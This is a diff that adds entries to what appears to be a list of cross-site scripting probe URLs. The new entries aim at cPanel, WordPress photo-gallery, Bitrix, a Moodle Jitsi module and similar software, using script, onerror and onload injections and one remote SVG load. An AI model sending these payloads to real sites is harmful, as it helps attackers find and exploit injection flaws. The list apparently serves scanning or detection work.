@@ -949,3 +949,12 @@ request?info=<svg onload=alert(
 /index.php?search=1af%22+onclick%3D
 /?subreddit=news&score=2134%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/index.php/%3C/script%3E%3Cscript%3Edocument.write(
+/wp-content/uploads/photo-gallery/xss.svg
+/web/set_profiling?profile=0&collector=<script>alert(document.domain)</script>
+:2080/cpanelwebcall/<img%20src=x%20onerror=
+:2082/cpanelwebcall/<img%20src=x%20onerror=
+:2083/cpanelwebcall/<img%20src=x%20onerror=
+:2086/cpanelwebcall/<img%20src=x%20onerror=
+/bitrix/tools/imagepg.php?img=//metascan.ru/poc.svg
+/mod/jitsi/sessionpriv.php?avatar=https%3A%2F%2Ftargetdomain.com%2Fuser%2Fpix.php%2F498%2Ff1.jpg&nom=test_user%27)%3balert(document.domain)%3b//&ses=test_user&t=1
